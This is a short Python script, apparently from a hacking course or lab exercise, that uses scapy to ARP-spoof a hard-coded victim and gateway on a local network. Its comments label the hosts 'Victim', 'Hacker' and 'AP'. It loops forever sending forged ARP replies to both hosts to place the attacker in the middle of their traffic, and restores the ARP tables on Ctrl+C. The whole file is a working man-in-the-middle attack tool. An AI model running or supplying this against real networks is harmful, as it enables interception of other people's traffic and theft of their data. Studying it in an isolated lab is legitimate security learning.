#! /usr/bin/env python
import scapy.all as scapy
import time
import sys


def getMac(ip):
    # scan ip: 10.211.55.3
    # pdst = Net ('10.211.55.1/24')
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast/arpRequest

    # answeredList = scapy.srp(arpRequestBroadcast, timeout=1)[0] ==> [0] is answered
    # answeredList = scapy.srp(arpRequestBroadcast, timeout=1)[1] ==> [1] is unanswered
    # verbose = False ==> remove Begin ...
    answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]

    # with element[0] get a default answer 10.211.55.3
    # with element[1] get a list answer 10.211.55.1 and 10.211.55.2
    return (answeredList[0][1].hwsrc)

# AP: 10.211.55.1/ 00:1c:42:00:00:18
# Victim: 10.211.55.4/00:1c:42:83:95:fc
# Hacker: 10.211.55.3/ 00:1c:42:2e:e8:18
# op=1 ==> request
# op=2 ==> response
# target_ip = "10.211.55.4" = victim_ip
# target_mac = "00:1c:42:83:95:fc" = victim_mac
# spoof_ip = "10.211.55.1" = ap_ip

# 1. Hacker change mac address of default gateway ==> spoof() send to victim
# 2. Hacker get Mac address of victim ==> restore() send to AP


def spoof(target_ip, spoof_ip):
    target_mac = getMac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = getMac(destination_ip)
    source_mac = getMac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    print(packet.show())
    print(packet.summary())
    scapy.send(packet, count=4, verbose=False)


# true is prevent change mac address of default gateway
target_ip = "10.211.55.4"
gateway_ip = "10.211.55.1"
try:
    sendPacketsCount = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sendPacketsCount = sendPacketsCount + 2
        # \r bỏ in theo dòng và ngang
        # end = "" ==> quit ctrl + c
        print("\r[+] Packet sent" + str(sendPacketsCount), end='')
        # print nằm ngang
        # sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ... Reseting ARP table ... Please wait .\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
